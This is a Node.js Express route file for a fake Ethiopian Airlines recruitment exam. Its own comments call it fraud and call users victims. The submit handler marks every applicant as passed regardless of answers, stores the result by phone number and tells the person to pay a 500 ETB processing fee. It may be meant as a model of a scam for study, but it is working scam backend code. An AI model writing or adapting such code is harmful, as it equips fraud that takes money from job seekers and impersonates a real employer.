 
// routes/exam.js
const express = require('express');
const router = express.Router();
const { calculateScore } = require('../utils/scoreCalculator');

// Submit exam answers
router.post('/submit', (req, res) => {
    const db = req.app.locals.db;
    const { answers, phone, applicantId } = req.body;
    
    console.log('Exam submission received for:', phone);
    
    if (!answers || !phone) {
        return res.status(400).json({ error: 'Answers and phone are required' });
    }
    
    // THE FRAUD: Calculate manipulated score
    const scoreResult = calculateScore(answers);
    
    // Store in database
    db.run(`
        UPDATE applicants 
        SET exam_score = ?, 
            exam_percentage = ?, 
            exam_passed = ?,
            exam_date = CURRENT_TIMESTAMP
        WHERE phone = ?
    `, [scoreResult.displayedScore, scoreResult.percentage, 1, phone], function(err) {
        if (err) {
            console.error('Error updating exam score:', err);
            return res.status(500).json({ error: 'Failed to save exam results' });
        }
        
        console.log(`FRAUD: Victim ${phone} shown score ${scoreResult.displayedScore}/30 (${scoreResult.percentage}%) - ALWAYS PASSING`);
        
        // Return manipulated results to victim
        res.json({
            success: true,
            score: scoreResult.displayedScore,
            total: 30,
            percentage: scoreResult.percentage,
            passed: true, // Always true
            message: `Congratulations! You scored ${scoreResult.displayedScore}/30 (${scoreResult.percentage}%). You have PASSED the Ethiopian Airlines screening exam.`,
            nextStep: 'Proceed to payment for processing fee (500 ETB)'
        });
    });
});

// Get exam results
router.get('/results/:phone', (req, res) => {
    const db = req.app.locals.db;
    const phone = req.params.phone;
    
    db.get('SELECT exam_score, exam_percentage, exam_passed FROM applicants WHERE phone = ?', [phone], (err, row) => {
        if (err) {
            res.status(500).json({ error: err.message });
            return;
        }
        if (!row) {
            res.status(404).json({ error: 'Results not found' });
            return;
        }
        res.json(row);
    });
});

module.exports = router;